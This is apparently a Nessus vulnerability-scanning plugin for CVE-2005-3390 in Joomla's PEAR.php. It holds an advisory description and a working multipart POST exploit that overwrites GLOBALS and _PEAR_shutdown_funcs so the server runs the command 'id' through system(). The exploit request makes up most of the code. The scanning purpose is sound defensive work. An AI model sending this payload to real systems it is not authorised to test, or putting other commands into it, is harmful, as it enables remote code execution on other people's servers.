#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that allows execution of
arbitrary PHP code. 

Description :

The 'includes/PEAR/PEAR.php' script included with the version of
Joomla installed on the remote host contains a programming flaw that
may allow an unauthenticated remote attacker to execute arbitrary PHP
code on the affected host, subject to the privileges of the web server
user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled and that the remote version of
PHP be older than 4.4.1 or 5.0.6. 

See also :

http://www.hardened-php.net/globals-problem
http://www.joomla.org/content/view/1843/74/

Solution :

Upgrade to Joomla version 1.0.11 or later and/or PHP version 4.4.1 /
5.0.6. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(22298);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-3390");
  script_bugtraq_id(15250, 19749);

  script_name(english:"Joomla < 1.0.11 Remote Code Execution Vulnerability");
  script_summary(english:"Tries to run a command in Joomla");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("joomla_detect.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/includes/PEAR/PEAR.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it does...
  #
  # nb: the script generally doesn't respond when called directly.
  if (egrep(string:res, pattern:"^HTTP/.* 200 OK"))
  {
    # Try to exploit the flaw to execute a command.
    cmd = "id";
    boundary = "bound";
    req = string(	
      "POST ",  url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";', "\r\n",
      "Content-Type: image/jpeg;\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][0]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "system\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][1]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      cmd, "\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) report = desc;
      else report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Nessus was able to execute the command 'id' on the remote host,\n",
        "which produced the following output :\n",
        "\n",
        line
      );
      security_warning(port:port, data:report);
      exit(0);
    }
  }
}
